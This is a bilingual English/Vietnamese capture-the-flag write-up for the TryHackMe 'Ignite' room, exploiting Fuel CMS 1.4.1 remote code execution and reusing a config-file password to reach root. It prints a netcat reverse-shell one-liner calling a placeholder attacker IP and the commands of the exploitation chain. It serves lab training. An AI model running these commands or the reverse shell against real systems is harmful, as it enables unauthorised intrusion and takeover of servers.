# TryHackMe - Ignite Write-up  
*(Bài Write-up TryHackMe - Ignite)*

## 📝 Introduction  
This is a walkthrough for the **Ignite** room on TryHackMe. The target is a machine running Fuel CMS 1.4.1, which is vulnerable to Remote Code Execution (RCE). By exploiting this vulnerability, we gain a foothold, capture the user flag, and escalate privileges to root.  
*(Đây là hướng dẫn chi tiết phòng Ignite. Máy mục tiêu chạy Fuel CMS 1.4.1, có lỗ hổng RCE. Ta sẽ khai thác để lấy quyền điều khiển, flag của user và leo thang thành root.)*

---

## 🔎 Enumeration  
First, we scan the target using **Nmap**:  
*(Đầu tiên quét cổng bằng Nmap)*

```bash
nmap -sC -sV -oN ignite.nmap 10.10.X.X
```

- Port **80** is open, running Apache.  
- Visiting the web page reveals **Fuel CMS 1.4.1**.  
*(Kết quả: chỉ có port 80 mở, chạy Apache. Truy cập web thấy Fuel CMS 1.4.1.)*

Checking `/robots.txt` shows `/fuel`, which is the admin page.  
*(Trong file robots.txt có đường dẫn `/fuel`, chính là trang quản trị.)*

---

## 💥 Exploitation (RCE)  
We search for known exploits using **searchsploit**:  
*(Tìm exploit có sẵn bằng searchsploit)*

```bash
searchsploit fuel cms 1.4.1
searchsploit -m 50477
```

Run the Python exploit:  
*(Chạy script exploit)*

```bash
python3 50477.py -u http://10.10.X.X
```

This gives us a command shell (`cmd>`). Testing with:  
*(Sẽ ra shell nhập lệnh. Test thử lệnh)*

```bash
cmd> whoami
```

The response is `www-data`.  
*(Kết quả trả về là user www-data.)*

---

## 🖥️ Reverse Shell  
Set up a listener on our machine:  
*(Mở listener trên máy mình)*

```bash
nc -nlvp 4444
```

Inject a reverse shell payload through the exploit:  
*(Gửi payload reverse shell qua exploit)*

```bash
cmd> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
```

We now have an interactive shell on the target.  
*(Giờ ta có shell tương tác trên server.)*

---

## 📂 User Flag  
Navigate to the home directory and capture the flag:  
*(Đi tới thư mục home và lấy flag của user)*

```bash
cd /home/www-data
cat user.txt
```

---

## 🔑 Privilege Escalation  
We look for sensitive files inside the web application. Checking the Fuel CMS configuration:  
*(Tìm file nhạy cảm, mở file config của Fuel CMS)*

```bash
cat /var/www/html/fuel/application/config/database.php
```

It reveals database credentials:  
*(Thấy tài khoản và mật khẩu DB)*

```php
'username' => 'root',
'password' => 'mememe',
```

Try switching to root:  
*(Dùng mật khẩu đó thử đổi sang root)*

```bash
su root
# password: mememe
```

Success! We are now root.  
*(Thành công, ta đã có quyền root.)*

---

## 👑 Root Flag  
Finally, read the root flag:  
*(Cuối cùng, đọc flag root)*

```bash
cd /root
cat root.txt
```

---

## ⚡ Vulnerabilities Explained  
1. **Remote Code Execution (RCE)** – Fuel CMS 1.4.1 is vulnerable to CVE-2018-16763 due to insecure use of `eval()` in PHP.  
   *(Lỗ hổng RCE do Fuel CMS 1.4.1 sử dụng `eval()` không an toàn.)*  

2. **Insecure Credential Management** – Database password is stored in plaintext in `database.php`.  
   *(Mật khẩu DB lưu dạng text trong file config.)*  

3. **Password Reuse** – The database root password is reused as the system root password.  
   *(Admin tái sử dụng mật khẩu DB làm mật khẩu hệ thống.)*  

---

## 🏁 Conclusion  
By identifying Fuel CMS 1.4.1, exploiting its RCE vulnerability, and retrieving credentials from configuration files, we escalated from `www-data` to root. This challenge highlights the dangers of insecure code execution and poor credential management.  
*(Bằng cách nhận diện Fuel CMS 1.4.1, khai thác lỗ hổng RCE và lấy mật khẩu trong file config, ta đã leo từ www-data lên root. Bài này nhấn mạnh nguy hiểm của code thiếu an toàn và quản lý mật khẩu kém.)*
